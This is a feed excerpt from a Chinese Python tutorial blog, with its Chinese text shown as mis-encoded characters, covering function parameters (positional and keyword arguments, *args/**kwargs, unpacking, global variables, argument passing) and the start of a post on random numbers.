      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>18. å‡½æ•°å‚æ•° â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-129/"/>
    <id>https://qiwihui.com/qiwihui-blog-129/</id>
    <published>2022-08-13T01:54:25.580Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è¯¦ç»†è®¨è®ºå‡½æ•°å½¢å‚ï¼ˆparametersï¼‰å’Œå‡½æ•°å®å‚ï¼ˆargumentsï¼‰ã€‚ æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>å½¢å‚å’Œå®å‚ä¹‹é—´çš„åŒºåˆ«</li><li>ä½ç½®å’Œå…³é”®å­—å‚æ•°</li><li>é»˜è®¤å‚æ•°</li><li>å˜é•¿å‚æ•°ï¼ˆ <code>*args</code> å’Œ <code>**kwargs</code>ï¼‰</li><li>å®¹å™¨æ‹†åŒ…æˆå‡½æ•°å‚æ•°</li><li>å±€éƒ¨ä¸å…¨å±€å‚æ•°</li><li>å‚æ•°ä¼ é€’ï¼ˆæŒ‰å€¼è¿˜æ˜¯æŒ‰å¼•ç”¨ï¼Ÿï¼‰</li></ul><span id="more"></span><h3><span id="xing-can-he-shi-can-zhi-jian-de-qu-bie">å½¢å‚å’Œå®å‚ä¹‹é—´çš„åŒºåˆ«</span></h3><ul><li>å½¢æ•°æ˜¯å®šä¹‰å‡½æ•°æ—¶åœ¨æ‹¬å·å†…å®šä¹‰æˆ–ä½¿ç”¨çš„å˜é‡</li><li>å®å‚æ˜¯è°ƒç”¨å‡½æ•°æ—¶ä¸ºè¿™äº›å‚æ•°ä¼ é€’çš„å€¼</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>(<span class="params">name</span>): <span class="comment"># name æ˜¯å½¢å‚</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line">print_name(<span class="string">&#x27;Alex&#x27;</span>) <span class="comment"># &#x27;Alex&#x27; æ˜¯å®å‚</span></span><br></pre></td></tr></table></figure><h3><span id="wei-zhi-he-guan-jian-zi-can-shu">ä½ç½®å’Œå…³é”®å­—å‚æ•°</span></h3><p>æˆ‘ä»¬å¯ä»¥å°†å‚æ•°ä½œä¸ºä½ç½®å‚æ•°æˆ–å…³é”®å­—å‚æ•°ä¼ é€’ã€‚ å…³é”®å­—å‚æ•°çš„ä¸€äº›å¥½å¤„å¯èƒ½æ˜¯ï¼š</p><ul><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡åç§°æ¥è°ƒç”¨å‚æ•°ï¼Œä»¥ä½¿å…¶æ›´æ¸…æ¥šåœ°è¡¨ç¤ºå…¶å«ä¹‰</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡æ–°æ’åˆ—å‚æ•°çš„æ–¹å¼æ¥ä½¿å‚æ•°æœ€æ˜“è¯»</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ä½ç½®å‚æ•°</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…³é”®å­—å‚æ•°</span></span><br><span class="line">foo(a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line">foo(c=<span class="number">3</span>, b=<span class="number">2</span>, a=<span class="number">1</span>) <span class="comment"># æ³¨æ„æ­¤å¤„é¡ºåºä¸é‡è¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ··åˆä½¿ç”¨</span></span><br><span class="line">foo(<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥ä¸‹ä¸å…è®¸</span></span><br><span class="line"><span class="comment"># foo(1, b=2, 3) # ä½ç½®å‚æ•°åœ¨å…³é”®å­—å‚æ•°ä¹‹å</span></span><br><span class="line"><span class="comment"># foo(1, b=2, a=3) # &#x27;a&#x27; æœ‰å¤šä¸ªå€¼</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3><span id="mo-ren-can-shu">é»˜è®¤å‚æ•°</span></h3><p>å‡½æ•°å¯ä»¥å…·æœ‰å¸¦æœ‰é¢„å®šä¹‰å€¼çš„é»˜è®¤å‚æ•°ã€‚ å¯ä»¥å¿½ç•¥æ­¤å‚æ•°ï¼Œç„¶åå°†é»˜è®¤å€¼ä¼ é€’ç»™å‡½æ•°ï¼Œæˆ–è€…å¯ä»¥å°†å‚æ•°ä¸å…¶ä»–å€¼ä¸€èµ·ä½¿ç”¨ã€‚ æ³¨æ„ï¼Œå¿…é¡»å°†é»˜è®¤å‚æ•°å®šä¹‰ä¸ºå‡½æ•°ä¸­çš„æœ€åä¸€ä¸ªå‚æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤å‚æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c, d=<span class="number">4</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c, d)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">foo(<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>, d=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸å…è®¸ï¼šé»˜è®¤å‚æ•°å¿…éœ€åœ¨æœ€å</span></span><br><span class="line"><span class="comment"># def foo(a, b=2, c, d=4):</span></span><br><span class="line"><span class="comment">#     print(a, b, c, d)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">100</span></span><br></pre></td></tr></table></figure><h3><span id="bian-chang-can-shu-args-he-kwargs">å˜é•¿å‚æ•°ï¼ˆ <code>*args</code> å’Œ <code>**kwargs</code>ï¼‰</span></h3><ul><li>å¦‚æœç”¨ä¸€ä¸ªæ˜Ÿå·ï¼ˆ <code>*</code> ï¼‰æ ‡è®°å‚æ•°ï¼Œåˆ™å¯ä»¥å°†ä»»æ„æ•°é‡çš„ä½ç½®å‚æ•°ä¼ é€’ç»™å‡½æ•°ï¼ˆé€šå¸¸ç§°ä¸º <code>*args</code>ï¼‰</li><li>å¦‚æœç”¨ä¸¤ä¸ªæ˜Ÿå·ï¼ˆ <code>**</code> ï¼‰æ ‡è®°å‚æ•°ï¼Œåˆ™å¯ä»¥å°†ä»»æ„æ•°é‡çš„å…³é”®å­—å‚æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ï¼ˆé€šå¸¸ç§°ä¸º  <code>**kwargs</code> ï¼‰ã€‚</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b)</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="keyword">for</span> kwarg <span class="keyword">in</span> kwargs:</span><br><span class="line">        <span class="built_in">print</span>(kwarg, kwargs[kwarg])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3, 4, 5 åˆå¹¶å…¥ args</span></span><br><span class="line"><span class="comment"># six and seven åˆå¹¶å…¥ kwargs</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, six=<span class="number">6</span>, seven=<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹Ÿå¯ä»¥çœç•¥ args æˆ– kwargs</span></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, three=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">six <span class="number">6</span></span><br><span class="line">seven <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line">three <span class="number">3</span></span><br></pre></td></tr></table></figure><h3><span id="qiang-zhi-guan-jian-zi-can-shu">å¼ºåˆ¶å…³é”®å­—å‚æ•°</span></h3><p>æœ‰æ—¶ä½ æƒ³è¦ä»…ä½¿ç”¨å…³é”®å­—çš„å‚æ•°ã€‚ ä½ å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>å¦‚æœåœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸­è¾“å…¥ <code>*,</code>ï¼Œåˆ™æ­¤åçš„æ‰€æœ‰å‚æ•°éƒ½å¿…é¡»ä½œä¸ºå…³é”®å­—å‚æ•°ä¼ é€’ã€‚</li><li>å˜é•¿å‚æ•°åé¢çš„å‚æ•°å¿…é¡»æ˜¯å…³é”®å­—å‚æ•°ã€‚</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, *, c, d</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c, d)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>, <span class="number">2</span>, c=<span class="number">3</span>, d=<span class="number">4</span>)</span><br><span class="line"><span class="comment"># ä¸å…è®¸:</span></span><br><span class="line"><span class="comment"># foo(1, 2, 3, 4)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å˜é•¿å‚æ•°åé¢çš„å‚æ•°å¿…é¡»æ˜¯å…³é”®å­—å‚æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">*args, last</span>):</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">        <span class="built_in">print</span>(arg)</span><br><span class="line">    <span class="built_in">print</span>(last)</span><br><span class="line"></span><br><span class="line">foo(<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, last=<span class="number">50</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure><h3><span id="chai-bao-cheng-can-shu">æ‹†åŒ…æˆå‚æ•°</span></h3><ul><li>å¦‚æœå®¹å™¨çš„é•¿åº¦ä¸å‡½æ•°å‚æ•°çš„æ•°é‡åŒ¹é…ï¼Œåˆ™åˆ—è¡¨æˆ–å…ƒç»„å¯ä»¥ç”¨ä¸€ä¸ªæ˜Ÿå·ï¼ˆ <code>*</code> ï¼‰æ‹†åŒ…ä¸ºå‚æ•°ã€‚</li><li>å­—å…¸å¯ä»¥æ‹†åŒ…ä¸ºå¸¦æœ‰ä¸¤ä¸ªæ˜Ÿå·ï¼ˆ <code>**</code> ï¼‰çš„å‚æ•°ï¼Œå…¶é•¿åº¦å’Œé”®ä¸å‡½æ•°å‚æ•°åŒ¹é…ã€‚</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b, c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># list/tuple æ‹†åŒ…ï¼Œé•¿åº¦å¿…éœ€åŒ¹é…</span></span><br><span class="line">my_list = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>] <span class="comment"># or tuple</span></span><br><span class="line">foo(*my_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dict æ‹†åŒ…ï¼Œé”®å’Œé•¿åº¦å¿…éœ€åŒ¹é…</span></span><br><span class="line">my_dict = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">foo(**my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># my_dict = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;d&#x27;: 3&#125; # ä¸å¯èƒ½ï¼Œå› ä¸ºå…³é”®å­—é”™è¯¯</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3><span id="ju-bu-bian-liang-yu-quan-ju-bian-liang">å±€éƒ¨å˜é‡ä¸å…¨å±€å˜é‡</span></h3><p>å¯ä»¥åœ¨å‡½æ•°ä½“å†…è®¿é—®å…¨å±€å˜é‡ï¼Œä½†æ˜¯è¦å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œæˆ‘ä»¬é¦–å…ˆå¿…é¡»å£°æ˜ <code>global var_name</code> æ‰èƒ½æ›´æ”¹å…¨å±€å˜é‡ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo1</span>():</span><br><span class="line">    x = number <span class="comment"># å…¨å±€å˜é‡åªèƒ½åœ¨è¿™é‡Œè®¿é—®</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;number in function:&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">number = <span class="number">0</span></span><br><span class="line">foo1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å…¨å±€å˜é‡</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo2</span>():</span><br><span class="line">    <span class="keyword">global</span> number <span class="comment"># ç°åœ¨å¯ä»¥è®¿é—®å’Œä¿®æ”¹å…¨å±€å˜é‡</span></span><br><span class="line">    number = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number before foo2(): &#x27;</span>, number)</span><br><span class="line">foo2() <span class="comment"># ä¿®æ”¹å…¨å±€å˜é‡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number after foo2(): &#x27;</span>, number)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number <span class="keyword">in</span> function: <span class="number">0</span></span><br><span class="line">number before foo2():  <span class="number">0</span></span><br><span class="line">number after foo2():  <span class="number">3</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬ä¸å†™ <code>global var_name</code> å¹¶ç»™ä¸å…¨å±€å˜é‡åŒåçš„å˜é‡èµ‹ä¸€ä¸ªæ–°å€¼ï¼Œè¿™å°†åœ¨å‡½æ•°å†…åˆ›å»ºä¸€ä¸ªå±€éƒ¨å˜é‡ã€‚ å…¨å±€å˜é‡ä¿æŒä¸å˜ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo3</span>():</span><br><span class="line">    number = <span class="number">3</span> <span class="comment"># è¿™æ˜¯å±€éƒ¨å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number before foo3(): &#x27;</span>, number)</span><br><span class="line">foo3() <span class="comment"># ä¸ä¼šä¿®æ”¹å…¨å±€å˜é‡</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;number after foo3(): &#x27;</span>, number)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number before foo3():  <span class="number">0</span></span><br><span class="line">number after foo3():  <span class="number">0</span></span><br></pre></td></tr></table></figure><h3><span id="can-shu-chuan-di">å‚æ•°ä¼ é€’</span></h3><p>Pythonä½¿ç”¨ä¸€ç§ç§°ä¸ºâ€œå¯¹è±¡è°ƒç”¨â€æˆ–â€œå¯¹è±¡å¼•ç”¨è°ƒç”¨â€çš„æœºåˆ¶ã€‚å¿…é¡»è€ƒè™‘ä»¥ä¸‹è§„åˆ™ï¼š</p><ul><li>ä¼ å…¥çš„å‚æ•°å®é™…ä¸Šæ˜¯å¯¹å¯¹è±¡çš„å¼•ç”¨ï¼ˆä½†å¼•ç”¨æ˜¯æŒ‰å€¼ä¼ é€’ï¼‰</li><li>å¯å˜å’Œä¸å¯å˜æ•°æ®ç±»å‹ä¹‹é—´çš„å·®å¼‚</li></ul><p>è¿™æ„å‘³ç€ï¼š</p><ol><li>å¯å˜å¯¹è±¡ï¼ˆä¾‹å¦‚åˆ—è¡¨ï¼Œå­—å…¸ï¼‰å¯ä»¥åœ¨æ–¹æ³•ä¸­è¿›è¡Œæ›´æ”¹ã€‚ä½†æ˜¯ï¼Œå¦‚æœåœ¨æ–¹æ³•ä¸­é‡æ–°ç»‘å®šå¼•ç”¨ï¼Œåˆ™å¤–éƒ¨å¼•ç”¨ä»å°†æŒ‡å‘åŸå§‹å¯¹è±¡ã€‚</li><li>ä¸èƒ½åœ¨æ–¹æ³•ä¸­æ›´æ”¹ä¸å¯å˜çš„å¯¹è±¡ï¼ˆä¾‹å¦‚intï¼Œstringï¼‰ã€‚ä½†æ˜¯<strong>åŒ…å«åœ¨</strong>å¯å˜å¯¹è±¡ä¸­çš„ä¸å¯å˜å¯¹è±¡å¯ä»¥åœ¨æ–¹æ³•ä¸­é‡æ–°åˆ†é…ã€‚</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸å¯å˜å¯¹è±¡ -&gt; ä¸å˜</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">x</span>):</span><br><span class="line">    x = <span class="number">5</span> <span class="comment"># x += 5 ä¹Ÿæ— æ•ˆï¼Œå› ä¸ºxæ˜¯ä¸å¯å˜çš„ï¼Œå¿…é¡»åˆ›å»ºä¸€ä¸ªæ–°å˜é‡</span></span><br><span class="line"></span><br><span class="line">var = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;var before foo():&#x27;</span>, var)</span><br><span class="line">foo(var)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;var after foo():&#x27;</span>, var)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">var before foo(): <span class="number">10</span></span><br><span class="line">var after foo(): <span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯å˜å¯¹è±¡ -&gt; å¯å˜</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list.append(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list before foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸å¯å˜å¯¹è±¡åŒ…å«åœ¨å¯å˜å¯¹è±¡å†… -&gt; å¯å˜</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list[<span class="number">0</span>] = -<span class="number">100</span></span><br><span class="line">    a_list[<span class="number">2</span>] = <span class="string">&quot;Paul&quot;</span></span><br><span class="line">    </span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Max&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é‡æ–°ç»‘å®šå¯å˜å¼•ç”¨ -&gt; ä¸å˜</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list = [<span class="number">50</span>, <span class="number">60</span>, <span class="number">70</span>] <span class="comment"># a_list æ˜¯å‡½æ•°å†…æ–°çš„å±€éƒ¨å˜é‡</span></span><br><span class="line">    a_list.append(<span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list before foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>å¯¹äºå¯å˜ç±»å‹ï¼Œè¯·å°å¿ƒä½¿ç”¨ <code>+=</code> å’Œ <code>=</code> æ“ä½œã€‚ ç¬¬ä¸€ä¸ªæ“ä½œå¯¹ä¼ é€’çš„å‚æ•°æœ‰å½±å“ï¼Œè€Œåè€…åˆ™æ²¡æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é‡æ–°ç»‘å®šå¼•ç”¨çš„å¦ä¸€ä¸ªä¾‹å­</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list += [<span class="number">4</span>, <span class="number">5</span>] <span class="comment"># è¿™ä¼šæ”¹å˜å¤–éƒ¨å˜é‡</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bar</span>(<span class="params">a_list</span>):</span><br><span class="line">    a_list = a_list + [<span class="number">4</span>, <span class="number">5</span>] <span class="comment"># åœ¨ä¼šé‡æ–°ç»‘å®šå¼•ç”¨åˆ°æœ¬åœ°å˜é‡</span></span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before foo():&#x27;</span>, my_list)</span><br><span class="line">foo(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after foo():&#x27;</span>, my_list)</span><br><span class="line"></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list before bar():&#x27;</span>, my_list)</span><br><span class="line">bar(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;my_list after bar():&#x27;</span>, my_list)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list before foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after foo(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">my_list before bar(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">my_list after bar(): [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      18. å‡½æ•°å‚æ•° â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>12. éšæœºæ•° â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-139/"/>
    <id>https://qiwihui.com/qiwihui-blog-139/</id>
    <published>2022-08-13T01:54:25.580Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>Pythonå®šä¹‰äº†ä¸€ç»„ç”¨äºç”Ÿæˆæˆ–æ“ä½œéšæœºæ•°çš„å‡½æ•°ã€‚ æœ¬æ–‡ä»‹ç»ï¼š</p><ul><li><code>random</code> æ¨¡å—</li><li>ç”¨ <code>random.seed()</code> å†ç”Ÿäº§æ•°å­—</li><li>ä½¿ç”¨ <code>secrets</code> æ¨¡å—åˆ›å»ºå¯†ç å­¦ä¸Šå¼ºçš„éšæœºæ•°</li><li>ç”¨ <code>numpy.random</code> åˆ›å»ºéšæœº nd æ•°ç»„</li></ul><h3><span id="random-mo-kuai"><code>random</code> æ¨¡å—</span></h3><p>è¯¥æ¨¡å—ä¸ºå„ç§ç‰ˆæœ¬å®ç°ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚å®ƒä½¿ç”¨Mersenne Twisterç®—æ³•ï¼ˆ<a href="https://en.wikipedia.org/wiki/Mersenne_Twister">https://en.wikipedia.org/wiki/Mersenne_Twister</a>ï¼‰ä½œä¸ºå…¶æ ¸å¿ƒç”Ÿæˆå™¨ã€‚ ä¹‹æ‰€ä»¥ç§°å…¶ä¸ºä¼ªéšæœºæ•°ï¼Œæ˜¯å› ä¸ºæ•°å­—çœ‹èµ·æ¥æ˜¯éšæœºçš„ï¼Œä½†æ˜¯æ˜¯å¯é‡ç°çš„ã€‚</p><span id="more"></span><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># [0,1) ä¹‹é—´éšæœºæµ®ç‚¹æ•°</span></span><br><span class="line">a = random.random()</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [a,b] ä¹‹é—´éšæœºæµ®ç‚¹æ•°</span></span><br><span class="line">a = random.uniform(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [a,b] ä¹‹é—´éšæœºæ•´æ•°ï¼Œb åŒ…æ‹¬ã€‚</span></span><br><span class="line">a = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹‹é—´éšæœºæ•´æ•°ï¼Œb ä¸åŒ…æ‹¬ã€‚</span></span><br><span class="line">a = random.randrange(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‚æ•°ä¸º mu å’Œ sigma çš„æ­£æ€åˆ†å¸ƒéšæœºæµ®ç‚¹æ•°</span></span><br><span class="line">a = random.normalvariate(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»åºåˆ—ä¸­éšæœºé€‰æ‹©å…ƒç´ </span></span><br><span class="line">a = random.choice(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»åºåˆ—ä¸­éšæœºé€‰æ‹© k ä¸ªå”¯ä¸€å…ƒç´ </span></span><br><span class="line">a = random.sample(<span class="built_in">list</span>(<span class="string">&quot;ABCDEFGHI&quot;</span>), <span 